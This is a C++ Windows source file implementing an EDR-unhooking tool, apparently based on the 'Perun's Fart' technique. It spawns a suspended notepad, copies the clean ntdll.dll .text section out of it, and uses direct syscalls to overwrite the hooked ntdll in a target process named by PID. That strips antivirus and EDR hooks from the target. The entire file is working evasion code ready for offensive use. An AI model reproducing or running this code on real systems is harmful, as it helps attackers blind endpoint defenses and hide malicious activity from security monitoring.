#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#define bytesToCompare 16

#include <iostream>
#include <windows.h>
#include "PerunsFart.h"
#include <Psapi.h>

HANDLE StartSuspendedProcess()
{
    PROCESS_INFORMATION processInfo;
    STARTUPINFOA startupInfo{}; 
    startupInfo.cb = sizeof(STARTUPINFOA);
    char cmd[] = "notepad.exe"; 
    if (!CreateProcessA(nullptr, cmd, nullptr, nullptr, false, CREATE_SUSPENDED,
        nullptr, nullptr, std::addressof(startupInfo), std::addressof(processInfo)))
    {
        std::cerr << "CreateProcess failed, " << GetLastError() << '\n';
        return NULL;
    }
    return processInfo.hProcess;
}

#define NtCurrentProcess() INVALID_HANDLE_VALUE

int wmain(int argc, wchar_t* argv[]) 
{
    if (argc != 2)
    {
        printf("Supply target pid to restore ntdll.dll for using new sleeping notepad. \n");
        return -1;
    }

    DWORD targetPid = _wtoi(argv[1]);

    HANDLE pausedProcess = StartSuspendedProcess();
    Sleep(5000); //Can take some while to start due to AV
    if (pausedProcess == NULL)
    {
        printf("ERROR: could not create sleeping notepad!");
        return -1;
    }

    //Open process using syscalls
    DWORD pid = targetPid;
    HANDLE processHandleTarget = NULL;
    OBJECT_ATTRIBUTES ObjectAttributesTarget;
    InitializeObjectAttributes(&ObjectAttributesTarget, NULL, 0, NULL, NULL);
    CLIENT_ID uPidTarget = { 0 };
    uPidTarget.UniqueProcess = (HANDLE)pid;
    uPidTarget.UniqueThread = (HANDLE)0;
    NTSTATUS statusOpenTarget = ZwOpenProcess10(&processHandleTarget, SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | 0xFFFF, &ObjectAttributesTarget, &uPidTarget);
    if (statusOpenTarget != 0)
    {
        printf("Error opening target process!");
        return -2;
    }

    HMODULE Ntdll = GetModuleHandleA((LPCSTR)"ntdll.dll");
    MODULEINFO moduleInfo = {};

    //Get ntdll.dll information based on loaded version for current process
    if (GetModuleInformation(GetCurrentProcess(), Ntdll, &moduleInfo, sizeof(moduleInfo)) == 0) {
        printf("GetModuleInformation error: %d\n", GetLastError());
        printf("[%d]\n", __LINE__);
        return -3;
    }

    // Get base address of hooked Ntdll from MODULEINFO struct
    LPVOID hookedNtdllBaseAddress = NULL;
    hookedNtdllBaseAddress = (LPVOID)moduleInfo.lpBaseOfDll;

    printf("%-20s 0x%p\n", "Tainted dll base address: ", hookedNtdllBaseAddress);

    PIMAGE_DOS_HEADER dosHeader = 0;
    PIMAGE_NT_HEADERS ntHeader = 0;
    PIMAGE_SECTION_HEADER sectionHeader = 0;
    LPSTR sectionName;
    SIZE_T textSectionSize = NULL;
    LPVOID hookedNtdllTextStartAddress = NULL;

    // Get DOS header
    dosHeader = (PIMAGE_DOS_HEADER)hookedNtdllBaseAddress;

    // Get Nt Header
    ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)hookedNtdllBaseAddress + dosHeader->e_lfanew);

    Sleep(50);
    // Loop through all the PE sections until we find .text section (some adapted code based on Shellycoat)
    for (SIZE_T i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        // Get PE section header
        sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        // Get section name
        sectionName = (LPSTR)sectionHeader->Name;

        // We found .text section
        if (!strcmp(sectionName, ".text")) {
            Sleep(50);
            printf("Found .text section\n");
                
            textSectionSize = sectionHeader->Misc.VirtualSize;
            printf(".text section size: %d\n", textSectionSize);
            hookedNtdllTextStartAddress = (LPVOID)((DWORD_PTR)hookedNtdllBaseAddress + (DWORD_PTR)sectionHeader->VirtualAddress);
            break;
        }
    }
    if (textSectionSize == NULL)
    {
        printf("Error: .text section not found!");
        return -4;
    }
    
    SIZE_T lpNumberOfBytesRead = 0;
    SIZE_T lpNumberOfBytesWritten = 0;
    PVOID buffer = (PVOID)malloc((ULONG)(textSectionSize+4096)); //4096 is page size

    printf("Reading from source...\n");
    NTSTATUS statusRead = NtReadVirtualMemory(pausedProcess,hookedNtdllTextStartAddress,buffer, textSectionSize,&lpNumberOfBytesRead);
    if (statusRead != STATUS_SUCCESS) {
        printf("NtReadVirtualMemory error: %X\n", statusRead);
        return -5;
    }
    //Remove page protection (store old details)
    printf("Removing page prot...\n");
    ULONG oldProtection;
    NTSTATUS statusProtect = ZwProtectVirtualMemory10(processHandleTarget, &hookedNtdllTextStartAddress,&textSectionSize, PAGE_EXECUTE_READWRITE, &oldProtection);
    if (statusProtect != STATUS_SUCCESS) {
        printf("ZwProtectVirtualMemory10 error: %X\n", statusProtect);
        return -6;
    }

    //Write fresh ntdll.dll
    printf("Writing to target...\n");
    NTSTATUS statusWrite = ZwWriteVirtualMemory10(processHandleTarget, hookedNtdllTextStartAddress, buffer, textSectionSize, &lpNumberOfBytesWritten);
    if (statusWrite != STATUS_SUCCESS) {
        printf("ZwWriteVirtualMemory10 error: %X\n", statusWrite);
        return -7;
    }

    //Restore right page protections
    printf("Restoring page prot...\n");
    NTSTATUS statusRestore = ZwProtectVirtualMemory10(processHandleTarget, &hookedNtdllTextStartAddress, &textSectionSize, PAGE_EXECUTE_READWRITE, &oldProtection);
    if (statusRestore != STATUS_SUCCESS) {
        printf("ZwProtectVirtualMemory10 error: %X\n", statusRestore);
        return -8;
    }
    TerminateProcess(pausedProcess, 0);
    CloseHandle(pausedProcess);
    printf("Done!\n");
}